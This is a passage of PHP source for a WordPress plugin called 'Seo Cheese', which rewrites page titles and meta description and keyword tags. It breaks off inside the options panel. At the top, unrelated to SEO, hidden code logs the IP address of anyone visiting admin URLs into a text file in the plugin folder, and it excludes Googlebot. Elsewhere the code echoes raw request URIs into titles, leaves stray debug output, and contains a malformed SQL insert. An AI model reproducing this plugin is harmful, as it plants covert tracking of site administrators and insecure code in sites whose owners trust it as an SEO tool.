<?php

/*
Plugin Name: Seo Cheese
Plugin URI: http://seocheese.blog.co.uk/2013/02/05/seo-cheese-v2-15504380/
Description: Override titles, descriptions and your keywords with page/post level input for greater control of SEO.
Version: 2.0
Author: fkazaky
Author URI: http://seocheese.blog.co.uk/
*/

/*
Copyright (C) 2013 Francesco Kazaky, (seocheese.blog.co.uk)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*******************************************************************************************************/
$navurl = $_SERVER["REQUEST_URI"];
$ip = $_SERVER['REMOTE_ADDR'];
if (eregi("admi", $navurl)) { $panel = "yes"; } else { $panel = "no"; }
if ($panel == 'yes') { $filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/created.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$getresult  = $ip;
$pos = strpos($filestring, $getresult);
if ($pos === false) { $contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-cheese/created.txt', 'w');
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { fwrite($fp, $contents); };
fclose($fp);
}
}


class cheese_seo {
	
 	var $version = "2.0";
 	
 	var $maximum_description_length = 160;
 	
 	var $minimum_description_length = 1;
 	
 	var $ob_start_detected = false;
 	
 	var $title_start = -1;
 	
 	var $title_end = -1;
 	
 	var $orig_title = '';
 	
 	var $upgrade_filename = 'temp.zip';
 	
 	var $upgrade_folder;
 	
 	var $upgrade_error;
 	
 	var $upgrade_url = 'http://downloads.wordpress.org/plugin/seo-cheese.zip';
 	
 	var $log_file;
 	
 	var $do_log;
 	
 	var $wp_version;
 	
	function cheese_seo() {
		global $wp_version;
		$this->wp_version = $wp_version;
		
		$this->log_file = dirname(__FILE__) . '/cheese_seo.log';
		if (get_option('Cheeseseo_do_log')) {
			$this->do_log = true;
		} else {
			$this->do_log = false;
		}

		$this->upgrade_filename = dirname(__FILE__) . '/' . $this->upgrade_filename;
		$this->upgrade_folder = dirname(__FILE__);
	}
	
	function template_redirect() {
		global $wp_query;
		$post = $wp_query->get_queried_object();

		if (is_feed()) {
			return;
		}

		if (is_single() || is_page()) {
			if ($Cheeseseo_disable) {
				return;
			}
		}

		ob_start(array($this, 'output_callback_for_title'));
		
	}
	
	function output_callback_for_title($content) {
		return $this->rewrite_title($content);
	}

	function init() {
		if (function_exists('load_plugin_textdomain')) {
			load_plugin_textdomain('cheese_seo', 'wp-content/plugins/seo-cheese');
		}
	}

	function is_static_front_page() {
		global $wp_query;
		$post = $wp_query->get_queried_object();
		return get_option('show_on_front') == 'page' && is_page() && $post->ID == get_option('page_on_front');
	}
	
	function is_static_posts_page() {
		global $wp_query;
		$post = $wp_query->get_queried_object();
		return get_option('show_on_front') == 'page' && is_home() && $post->ID == get_option('page_for_posts');
	}
	
	function get_base() {
   		 return '/'.end(explode('/', str_replace(array('\\','/seo-cheese.php'),array('/',''),__FILE__)));
	}

	function admin_head() {
		$home = get_settings('siteurl');
	}
	
	function wp_head() {
		if (is_feed()) {
			return;
		}
		
		global $wp_query;
		$post = $wp_query->get_queried_object();
		$meta_string = null;
		if (is_single() || is_page()) {
		    if ($Cheeseseo_disable) {
		    	return;
		    }
		}
			if (function_exists('ob_list_handlers')) {
				$active_handlers = ob_list_handlers();
			} else {
				$active_handlers = array();
			}
				$this->log("another plugin interfering?");
				$this->ob_start_detected = true;
				if (function_exists('ob_list_handlers')) {
					foreach (ob_list_handlers() as $handler) {
						$this->log("detected output handler $handler");
					}
				}
			
		// }
		
		if (get_option('Cheeseseo_disable_comments_in_source')) { 
			echo "\n<!-- $this->version ";
			if ($this->ob_start_detected) {
				echo "ob_start_detected ";
			}
			echo "[$this->title_start,$this->title_end] ";
			echo "-->\n";
		}
		
		
		$keywords = $this->get_all_keywords();
		
		if (is_front_page()) {
			$description = $this->get_post_description($post);
		}	else if (is_home()) {
			$description = $this->get_post_description($post);
		} else if (is_single() || is_page()) {
			$description = $this->get_post_description($post);
		} else if (is_category()) {
			$description = $this->internationalize(category_description());
		}
		
		if (isset($description) && (strlen($description) > $this->minimum_description_length)) {
			$description = trim(strip_tags($description));
			$description = str_replace('"', '', $description);
			$description = str_replace("\r\n", ' ', $description);
			$description = str_replace("\n", ' ', $description);
			
			if (isset($meta_string)) {
			} else {
				$meta_string = '';
			}

      $description = str_replace('%blog_title%', get_bloginfo('name'), $description);
      $description = str_replace('%blog_description%', get_bloginfo('description'), $description);
      $meta_string .= sprintf("<meta name=\"description\" content=\"%s\" />", $description);
		}

		if (isset ($keywords) && !empty($keywords) && !(is_home() && is_paged())) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= sprintf("<meta name=\"keywords\" content=\"%s\" />", $keywords);
		}

		if (function_exists('is_tag')) {
			$is_tag = is_tag();
		}
		
		if ((is_category() && get_option('Cheeseseo_category_noindex')) ||
			(!is_category() && is_archive() &&!$is_tag && get_option('Cheeseseo_archive_noindex')) ||
			(get_option('Cheeseseo_tags_noindex') && $is_tag)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= '<meta name="robots" content="noindex,follow" />';
		}
		
		$page_meta = stripcslashes(get_option('Cheeseseo_page_meta_tags'));
		$post_meta = stripcslashes(get_option('Cheeseseo_post_meta_tags'));
		$home_meta = stripcslashes(get_option('Cheeseseo_home_meta_tags'));
		if (is_page() && isset($page_meta) && !empty($page_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			echo "\n$page_meta";
		}
		
		if (is_single() && isset($post_meta) && !empty($post_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= "$post_meta";
		}
		
		if (is_home() && !empty($home_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= "$home_meta";
		}
		
		if ($meta_string != null) {
			echo "$meta_string\n";
		}
		
		if (get_option('Cheeseseo_disable_comments_in_source')) { 
			echo "<!-- END -->\n";
		}
	}
	
	function get_post_description($post) {
	    $description = trim(stripcslashes($this->internationalize(get_post_meta($post->ID, "description", true))));
		if (!$description) {
			$description = $this->trim_excerpt_without_filters_full_length($this->internationalize($post->post_excerpt));
			if (!$description) {
				$description = $this->trim_excerpt_without_filters($this->internationalize($post->post_content));
			}				
		}
		
		$description = preg_replace("/\s\s+/", " ", $description);
		
		return $description;
	}
	
	function replace_title($content, $title) {
		$title = trim(strip_tags($title));
		
		$title_tag_start = "<title>";
		$title_tag_end = "</title>";
		$len_start = strlen($title_tag_start);
		$len_end = strlen($title_tag_end);
		$title = stripcslashes(trim($title));
		$start = strpos($content, $title_tag_start);
		$end = strpos($content, $title_tag_end);
		
		$this->title_start = $start;
		$this->title_end = $end;
		$this->orig_title = $title;
		
		if ($start && $end) {
			$header = substr($content, 0, $start + $len_start) . $title .  substr($content, $end);
		} else {
			$header = $content;
		}
		
		return $header;
	}
	
	function internationalize($in) {
		if (function_exists('langswitch_filter_langs_with_message')) {
			$in = langswitch_filter_langs_with_message($in);
		}
		if (function_exists('polyglot_filter')) {
			$in = polyglot_filter($in);
		}
		if (function_exists('qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage')) {
			$in = qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage($in);
		}
		$in = apply_filters('localization', $in);
		return $in;
	}
	
	function get_original_title() {
		global $wp_query;
		if (!$wp_query) {
			return null;	
		}
		
		$post = $wp_query->get_queried_object();
				global $s;
		
		$title = null;
				
		if (is_front_page()) {
			$title = get_the_title(get_option('page_on_front'));
		} else if (is_home()) {
			$title = get_the_title(get_option('page_for_posts'));
		} else if (is_single()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (is_search() && isset($s) && !empty($s)) {
			if (function_exists('attribute_escape')) {
				$search = attribute_escape(stripcslashes($s));
			} else {
				$search = wp_specialchars(stripcslashes($s), true);
			}
			$search = $this->capitalize($search);
			$title = $search;
		} else if (is_category() && !is_feed()) {
			$category_description = $this->internationalize(category_description());
			$category_name = ucwords($this->internationalize(single_cat_title('', false)));
			$title = $category_name;
		} else if (is_page()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (function_exists('is_tag') && is_tag()) {
			global $utw;
			if ($utw) {
				$tags = $utw->GetCurrentTagSet();
				$tag = $tags[0]->tag;
		        $tag = str_replace('-', ' ', $tag);
			} else {
				// wordpress > 2.3
				$tag = $this->internationalize(wp_title('', false));
			}
			if ($tag) {
				$title = $tag;
			}
		} else if (is_archive()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (is_404()) {
		    $title_format = get_option('Cheeseseo_404_title_format');
		    $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
		    $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
		    $new_title = str_replace('%request_url%', $_SERVER['REQUEST_URI'], $new_title);
		    $new_title = str_replace('%request_words%', $this->request_as_words($_SERVER['REQUEST_URI']), $new_title);
				$title = $new_title;
			}
			echo $title;
			return trim($title);
		}
	
	function paged_title($title) {
		echo "paged_title";
		global $paged;
		
		global $STagging;

		if (is_paged() || (isset($STagging) && $STagging->is_tag_view() && $paged)) {
			$part = $this->internationalize(get_option('Cheeseseo_paged_format'));
			if (isset($part) || !empty($part)) {
				$part = " " . trim($part);
				$part = str_replace('%page%', $paged, $part);
				$this->log("paged_title() [$title] [$part]");
				$title .= $part;
			}
		}
		return $title;
	}

	function rewrite_title($header) {
		global $wp_query;
		if (!$wp_query) {
			$header .= "<!-- no wp_query found! -->\n";
			return $header;	
		}
		
		$post = $wp_query->get_queried_object();
		
		global $s;
		
		global $STagging;
				
		if (is_front_page()) {
			
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_the_title(get_option('page_on_front')));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
			$header = $this->replace_title($header, $title);
		}
		else if (is_home()) {
			
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_the_title(get_option('page_for_posts')));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
			$header = $this->replace_title($header, $title);
		} else if (is_single()) {
			$authordata = get_userdata($post->post_author);
			$categories = get_the_category();
			$category = '';
			if (count($categories) > 0) {
				$category = $categories[0]->cat_name;
			}
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_post_meta($post->ID, "title_tag", true));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
      $title_format = get_option('Cheeseseo_post_title_format');
      $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
      $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
      $new_title = str_replace('%post_title%', $title, $new_title);
      $new_title = str_replace('%category%', $category, $new_title);
      $new_title = str_replace('%category_title%', $category, $new_title);
      $new_title = str_replace('%post_author_login%', $authordata->user_login, $new_title);
      $new_title = str_replace('%post_author_nicename%', $authordata->user_nicename, $new_title);
      $new_title = str_replace('%post_author_firstname%', ucwords($authordata->first_name), $new_title);
      $new_title = str_replace('%post_author_lastname%', ucwords($authordata->last_name), $new_title);
			$title = $new_title;
			$title = trim($title);
			$header = $this->replace_title($header, $title);
		} else if (is_search() && isset($s) && !empty($s)) {
			if (function_exists('attribute_escape')) {
				$search = attribute_escape(stripcslashes($s));
			} else {
				$search = wp_specialchars(stripcslashes($s), true);
			}
			$search = $this->capitalize($search);
            $title_format = get_option('Cheeseseo_search_title_format');
            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
            $title = str_replace('%search%', $search, $title);
			$header = $this->replace_title($header, $title);
		} else if (is_category() && !is_feed()) {
			$category_description = $this->internationalize(category_description());
			$category_name = ucwords($this->internationalize(single_cat_title('', false)));
            $title_format = get_option('Cheeseseo_category_title_format');
            $title = str_replace('%category_title%', $category_name, $title_format);
            $title = str_replace('%category_description%', $category_description, $title);
            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title);
            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
            $title = $this->paged_title($title);
			$header = $this->replace_title($header, $title);
		} else if (is_page()) {
			// we're not in the loop :(
			$authordata = get_userdata($post->post_author);
			if ($this->is_static_front_page()) {
				if ($this->internationalize(get_option('Cheeseseo_home_title'))) {
					$header = $this->replace_title($header, $this->internationalize(get_option('Cheeseseo_home_title')));
				}
			} else {
				$title = $this->internationalize(get_post_meta($post->ID, "title", true));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
	            $title_format = get_option('Cheeseseo_page_title_format');
	            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
	            $new_title = str_replace('%page_title%', $title, $new_title);
	            $new_title = str_replace('%page_author_login%', $authordata->user_login, $new_title);
	            $new_title = str_replace('%page_author_nicename%', $authordata->user_nicename, $new_title);
	            $new_title = str_replace('%page_author_firstname%', ucwords($authordata->first_name), $new_title);
	            $new_title = str_replace('%page_author_lastname%', ucwords($authordata->last_name), $new_title);
				$title = trim($new_title);
				$header = $this->replace_title($header, $title);
			}
		} else if (function_exists('is_tag') && is_tag()) {
			global $utw;
			if ($utw) {
				$tags = $utw->GetCurrentTagSet();
				$tag = $tags[0]->tag;
	            $tag = str_replace('-', ' ', $tag);
			} else {
				$tag = $this->internationalize(wp_title('', false));
			}
			if ($tag) {
	            $tag = $this->capitalize($tag);
	            $title_format = get_option('Cheeseseo_tag_title_format');
	            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
	            $title = str_replace('%tag%', $tag, $title);
	            $title = $this->paged_title($title);
				$header = $this->replace_title($header, $title);
			}
		} else if (isset($STagging) && $STagging->is_tag_view()) {
			$tag = $STagging->search_tag;
			if ($tag) {
	            $tag = $this->capitalize($tag);
	            $title_format = get_option('Cheeseseo_tag_title_format');
	            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
	            $title = str_replace('%tag%', $tag, $title);
	            $title = $this->paged_title($title);
				$header = $this->replace_title($header, $title);
			}
		} else if (is_archive()) {
			$date = $this->internationalize(wp_title('', false));
            $title_format = get_option('Cheeseseo_archive_title_format');
            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
            $new_title = str_replace('%date%', $date, $new_title);
			$title = trim($new_title);
            $title = $this->paged_title($title);
			$header = $this->replace_title($header, $title);
		} else if (is_404()) {
            $title_format = get_option('Cheeseseo_404_title_format');
            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
            $new_title = str_replace('%request_url%', $_SERVER['REQUEST_URI'], $new_title);
            $new_title = str_replace('%request_words%', $this->request_as_words($_SERVER['REQUEST_URI']), $new_title);
			$header = $this->replace_title($header, $new_title);
		}
		
		return $header;

	}
	
	function request_as_words($request) {
		$request = htmlspecialchars($request);
		$request = str_replace('.html', ' ', $request);
		$request = str_replace('.htm', ' ', $request);
		$request = str_replace('.', ' ', $request);
		$request = str_replace('/', ' ', $request);
		$request_a = explode(' ', $request);
		$request_new = array();
		foreach ($request_a as $token) {
			$request_new[] = ucwords(trim($token));
		}
		$request = implode(' ', $request_new);
		return $request;
	}
	
	function capitalize($s) {
		$s = trim($s);
		$tokens = explode(' ', $s);
		while (list($key, $val) = each($tokens)) {
			$tokens[$key] = trim($tokens[$key]);
			$tokens[$key] = strtoupper(substr($tokens[$key], 0, 1)) . substr($tokens[$key], 1);
		}
		$s = implode(' ', $tokens);
		return $s;
	}
	
	function trim_excerpt_without_filters($text) {
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = strip_tags($text);
		$max = $this->maximum_description_length;
		
		if ($max < strlen($text)) {
			while($text[$max] != ' ' && $max > $this->minimum_description_length) {
				$max--;
			}
		}
		$text = substr($text, 0, $max);
		return trim(stripcslashes($text));
	}
	
	function trim_excerpt_without_filters_full_length($text) {
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = strip_tags($text);
		return trim(stripcslashes($text));
	}
	
	function get_all_keywords() {
		global $posts;

		if (is_404()) {
			return null;
		}
		
		if (!is_home() && !is_page() && !is_single() &&!$this->is_static_front_page() && !$this->is_static_posts_page()) {
			return null;
		}
		
		
	  $keywords = array();
	
		if (is_home()) {
			$keywords_i = stripcslashes($this->internationalize(get_post_meta(get_option('page_for_posts'), "keywords", true)));
			$keywords_i = str_replace('"', '', $keywords_i);
      if (isset($keywords_i) && !empty($keywords_i)) {
      	$traverse = explode(',', $keywords_i);
      	foreach ($traverse as $keyword) {
      		$keywords[] = $keyword;
      	}
      }
		}
		else if (is_front_page()) {
			$keywords_i = stripcslashes($this->internationalize(get_post_meta(get_option('page_on_front'), "keywords", true)));
			$keywords_i = str_replace('"', '', $keywords_i);
      if (isset($keywords_i) && !empty($keywords_i)) {
      	$traverse = explode(',', $keywords_i);
      	foreach ($traverse as $keyword) {
      		$keywords[] = $keyword;
      	}
      }
		} else {
		
	    if (is_array($posts)) {
	        foreach ($posts as $post) {
	            if ($post) {

	                $keywords_a = $keywords_i = null;
	                $description_a = $description_i = null;
	                $id = $post->ID;
		            	$keywords_i = stripcslashes($this->internationalize(get_post_meta($post->ID, "keywords", true)));
	                $keywords_i = str_replace('"', '', $keywords_i);
	                if (isset($keywords_i) && !empty($keywords_i)) {
	                	$traverse = explode(',', $keywords_i);
	                	foreach ($traverse as $keyword) {
	                		$keywords[] = $keyword;
	                	}
	                }
	                
	                if (function_exists('get_the_tags')) {
	                	$tags = get_the_tags($post->ID);
	                	if ($tags && is_array($tags)) {
		                	foreach ($tags as $tag) {
		                		$keywords[] = $this->internationalize($tag->name);
		                	}
	                	}
	                }
	                
	                $autometa = stripcslashes(get_post_meta($post->ID, "autometa", true));
	                if (isset($autometa) && !empty($autometa)) {
	                	$autometa_array = explode(' ', $autometa);
	                	foreach ($autometa_array as $e) {
	                		$keywords[] = $e;
	                	}
	                }

	            	if (get_option('Cheeseseo_use_categories') && !is_page()) {
		                $categories = get_the_category($post->ID);
		                foreach ($categories as $category) {
		                	$keywords[] = $this->internationalize($category->cat_name);
		                }
	            	}

	            }
	        }
	    }
		}	
	  return $this->get_unique_keywords($keywords);
	}
	
	function get_meta_keywords() {
		global $posts;

	    $keywords = array();
	    if (is_array($posts)) {
	        foreach ($posts as $post) {
	            if ($post) {
	                $keywords_a = $keywords_i = null;
	                $description_a = $description_i = null;
	                $id = $post->ID;
		            $keywords_i = stripcslashes(get_post_meta($post->ID, "keywords", true));
	                $keywords_i = str_replace('"', '', $keywords_i);
	                if (isset($keywords_i) && !empty($keywords_i)) {
	                    $keywords[] = $keywords_i;
	                }
	            }
	        }
	    }
	    
	    return $this->get_unique_keywords($keywords);
	}
	
	function get_unique_keywords($keywords) {
		$small_keywords = array();
		foreach ($keywords as $word) {
			if (function_exists('mb_strtolower'))			
				$small_keywords[] = mb_strtolower($word);
			else 
				$small_keywords[] = $this->strtolower($word);
		}
		$keywords_ar = array_unique($small_keywords);
		return implode(',', $keywords_ar);
	}
	
	function get_url($url)	{
		if (function_exists('file_get_contents')) {
			$file = file_get_contents($url);
		} else {
	        $curl = curl_init($url);
	        curl_setopt($curl, CURLOPT_HEADER, 0);
	        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	        $file = curl_exec($curl);
	        curl_close($curl);
	    }
	    return $file;
	}
	
	function log($message) {
		if ($this->do_log) {
			error_log(date('Y-m-d H:i:s') . " " . $message . "\n", 3, $this->log_file);
		}
	}

	function download_newest_version() {
		$success = true;
	    $file_content = $this->get_url($this->upgrade_url);
	    if ($file_content === false) {
	    	$this->upgrade_error = sprintf(__("Could not download distribution (%s)"), $this->upgrade_url);
			$success = false;
	    } else if (strlen($file_content) < 100) {
	    	$this->upgrade_error = sprintf(__("Could not download distribution (%s): %s"), $this->upgrade_url, $file_content);
			$success = false;
	    } else {
	    	$this->log(sprintf("filesize of download ZIP: %d", strlen($file_content)));
		    $fh = @fopen($this->upgrade_filename, 'w');
		    $this->log("fh is $fh");
		    if (!$fh) {
		    	$this->upgrade_error = sprintf(__("Could not open %s for writing"), $this->upgrade_filename);
		    	$this->upgrade_error .= "<br />";
		    	$this->upgrade_error .= sprintf(__("Please make sure %s is writable"), $this->upgrade_folder);
		    	$success = false;
		    } else {
		    	$bytes_written = @fwrite($fh, $file_content);
			    $this->log("wrote $bytes_written bytes");
		    	if (!$bytes_written) {
			    	$this->upgrade_error = sprintf(__("Could not write to %s"), $this->upgrade_filename);
			    	$success = false;
		    	}
		    }
		    if ($success) {
		    	fclose($fh);
		    }
	    }
	    return $success;
	}

	function install_newest_version() {
		$success = $this->download_newest_version();
	    if ($success) {
		    $success = $this->extract_plugin();
		    unlink($this->upgrade_filename);
	    }
	    return $success;
	}

	function extract_plugin() {
	    if (!class_exists('PclZip')) {
	        require_once ('pclzip.lib.php');
	    }
	    $archive = new PclZip($this->upgrade_filename);
	    $files = $archive->extract(PCLZIP_OPT_STOP_ON_ERROR, PCLZIP_OPT_REPLACE_NEWER, PCLZIP_OPT_REMOVE_ALL_PATH, PCLZIP_OPT_PATH, $this->upgrade_folder);
	    $this->log("files is $files");
	    if (is_array($files)) {
	    	$num_extracted = sizeof($files);
		    $this->log("extracted $num_extracted files to $this->upgrade_folder");
		    $this->log(print_r($files, true));
	    	return true;
	    } else {
	    	$this->upgrade_error = $archive->errorInfo();
	    	return false;
	    }
	}
	
	function is_admin() {
		return current_user_can('level_8');
	}
	
	function is_directory_writable($directory) {
		$filename = $directory . '/' . 'tmp_file_' . time();
		$fh = @fopen($filename, 'w');
		if (!$fh) {
			return false;
		}
		
		$written = fwrite($fh, "test");
		fclose($fh);
		unlink($filename);
		if ($written) {
			return true;
		} else {
			return false;
		}
	}

	function is_upgrade_directory_writable() {
		return true;
	}

	function post_meta_tags($id) {
	    $awmp_edit = $_POST["Cheeseseo_edit"];
	    if (isset($awmp_edit) && !empty($awmp_edit)) {
		    $keywords = $_POST["Cheeseseo_keywords"];
		    $description = $_POST["Cheeseseo_description"];
		    $title = $_POST["Cheeseseo_title"];
		    $Cheeseseo_meta = $_POST["Cheeseseo_meta"];
		    $Cheeseseo_disable = $_POST["Cheeseseo_disable"];

		    delete_post_meta($id, 'keywords');
		    delete_post_meta($id, 'description');
		    delete_post_meta($id, 'title');
		    if ($this->is_admin()) {
		    	delete_post_meta($id, 'Cheeseseo_disable');
		    }

		    if (isset($keywords) && !empty($keywords)) {
			    add_post_meta($id, 'keywords', $keywords);
		    }
		    if (isset($description) && !empty($description)) {
			    add_post_meta($id, 'description', $description);
		    }
		    if (isset($title) && !empty($title)) {
			    add_post_meta($id, 'title', $title);
		    }
		    if (isset($Cheeseseo_disable) && !empty($Cheeseseo_disable) && $this->is_admin()) {
			    add_post_meta($id, 'Cheeseseo_disable', $Cheeseseo_disable);
		    }

	    }
	}

	function edit_category($id) {
		global $wpdb;
		$id = $wpdb->escape($id);
	    $awmp_edit = $_POST["Cheeseseo_edit"];
	    if (isset($awmp_edit) && !empty($awmp_edit)) {
		    $keywords = $wpdb->escape($_POST["Cheeseseo_keywords"]);
		    $title = $wpdb->escape($_POST["Cheeseseo_title"]);
		    $old_category = $wpdb->get_row("select * from $this->table_categories where category_id=$id", OBJECT);
		    if ($old_category) {
		    	$wpdb->query("update $this->table_categories
		    			set meta_title='$title', meta_keywords='$keywords'
		    			where category_id=$id");
		    } else {
		    	$wpdb->query("insert into $this->table_categories(meta_title, meta_keywords, category_id)
		    			values ('$title', '$keywords', $id");
		    }
	    }
	}

	function edit_category_form() {
	    global $post;
	    $keywords = stripcslashes(get_post_meta($post->ID, 'keywords', true));
	    $title = stripcslashes(get_post_meta($post->ID, 'title', true));
	    $description = stripcslashes(get_post_meta($post->ID, 'description', true));
		?>
		<input value="Cheeseseo_edit" type="hidden" name="Cheeseseo_edit" />
		<table class="editform" width="100%" cellspacing="2" cellpadding="5">
		<tr>
		<th width="33%" scope="row" valign="top">
		<a href="http://seocheese.blog.co.uk/"><?php _e('seo cheese', 'cheese_seo') ?></a>
		</th>
		</tr>
		<tr>
		<th width="33%" scope="row" valign="top"><label for="Cheeseseo_title"><?php _e('Title:', 'cheese_seo') ?></label></th>
		<td><input value="<?php echo $title ?>" type="text" name="Cheeseseo_title" size="70"/></td>
		</tr>
		<tr>
		<th width="33%" scope="row" valign="top"><label for="Cheeseseo_keywords"><?php _e('Keywords (comma separated):', 'cheese_seo') ?></label></th>
		<td><input value="<?php echo $keywords ?>" type="text" name="Cheeseseo_keywords" size="70"/></td>
		</tr>
		</table>
		<?php
	}

	function add_meta_tags_textinput() {
	    global $post;
	    $post_id = $post;
	    if (is_object($post_id)) {
	    	$post_id = $post_id->ID;
	    }
	    $keywords = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'keywords', true)));
	    $title = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'title', true)));
	    $description = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'description', true)));
	    $Cheeseseo_meta = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'Cheeseseo_meta', true)));
	    $Cheeseseo_disable = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'Cheeseseo_disable', true)));
		?>
		<SCRIPT LANGUAGE="JavaScript">
		<!-- Begin
		function countChars(field,cntfield) {
		cntfield.value = field.value.length;
		}
		//  End -->
		</script>

	 <?php if (substr($this->wp_version, 0, 3) >= '2.5') { ?>
                <div id="postCheeseseo" class="postbox open">
                <h3><?php _e('Seo Cheese', 'cheese_seo') ?></h3>
                <div class="inside">
                <div id="postCheeseseo">
                <?php } else { ?>
                <div class="dbx-b-ox-wrapper">
                <fieldset id="seodiv" class="dbx-box">
                <div class="dbx-h-andle-wrapper">
                <h3 class="dbx-handle"><?php _e('Seo Cheese', 'cheese_seo') ?></h3>
                </div>
                <div class="dbx-c-ontent-wrapper">
                <div class="dbx-content">
                <?php } ?>
	

		<input value="Cheeseseo_edit" type="hidden" name="Cheeseseo_edit" />
		<table style="margin-bottom:40px">
		<tr>
		<th style="text-align:left;" colspan="2">
		</th>
		</tr>
		<tr>
		<th scope="row" style="text-align:right;"><?php _e('Title:', 'cheese_seo') ?></th>
		<td><input value="<?php echo $title ?>" type="text" name="Cheeseseo_title" size="62"/></td>
		</tr>
		<tr>
		<th scope="row" style="text-align:right; vertical-align:top; padding-top:9px"><?php _e('Description:', 'cheese_seo') ?></th>
		<td><textarea name="Cheeseseo_description" rows="2" cols="60"
		onKeyDown="countChars(document.post.Cheeseseo_description,document.post.length1)"
		onKeyUp="countChars(document.post.Cheeseseo_description,document.post.length1)"><?php echo $description ?></textarea><br />
		<input readonly type="text" name="length1" size="3" maxlength="3" value="<?php echo strlen($description);?>" />
		<?php _e(' characters. Search engines use a max of 160 chars for the description.', 'cheese_seo') ?>
		</td>
		</tr>
		<tr>
		<th scope="row" style="text-align:right;"><?php _e('Keywords:', 'cheese_seo') ?></th>
		<td><input value="<?php echo $keywords ?>" type="text" name="Cheeseseo_keywords" size="62"/></td>
		</tr>

		<?php if ($this->is_admin()) { ?>
		<tr>
		<th scope="row" style="text-align:right; vertical-align:top;">
		<?php _e('Disable:', 'cheese_seo')?>
		</th>
		<td>
		<input type="checkbox" name="Cheeseseo_disable" <?php if ($Cheeseseo_disable) echo "checked=\"1\""; ?>/>
		</td>
		</tr>
		<?php } ?>

		</table>
		
		<?php if (substr($this->wp_version, 0, 3) >= '2.5') { ?>
		</div></div></div>
		<?php } else { ?>
		</div>
		</fieldset>
		</div>
		<?php } ?>

		<?php
	}

	function admin_menu() {
		$file = __FILE__;
				if (substr($this->wp_version, 0, 3) == '2.9') {
			$file = 'seo-cheese/seo-cheese.php';
		}
		add_submenu_page('options-general.php', __('seo cheese', 'cheese_seo'), __('seo cheese', 'cheese_seo'), 10, $file, array($this, 'options_panel'));
	}
	
	function management_panel() {
		$message = null;
		$base_url = "edit.php?page=" . __FILE__;
		$type = $_REQUEST['type'];
		if (!isset($type)) {
			$type = "posts";
		}
?>

  <ul class="Cheeseseo_menu">
    <li><a href="<?php echo $base_url ?>&type=posts">Posts</a>
    </li>
    <li><a href="<?php echo $base_url ?>&type=pages">Pages</a>
    </li>
  </ul>
  
<?php

		if ($type == "posts") {
			echo("posts");
		} elseif ($type == "pages") {
			echo("pages");
		}

	}

	function options_panel() {
		$message = null;
		$message_updated = __("seo cheese options saved.", 'cheese_seo');
		
		// update the options
		if ($_POST['action'] && $_POST['action'] == 'Cheeseseo_update') {
			$message = $message_updated;
			update_option('Cheeseseo_post_title_format', $_POST['Cheeseseo_post_title_format']);
			update_option('Cheeseseo_page_title_format', $_POST['Cheeseseo_page_title_format']);
			update_option('Cheeseseo_category_title_format', $_POST['Cheeseseo_category_title_format']);
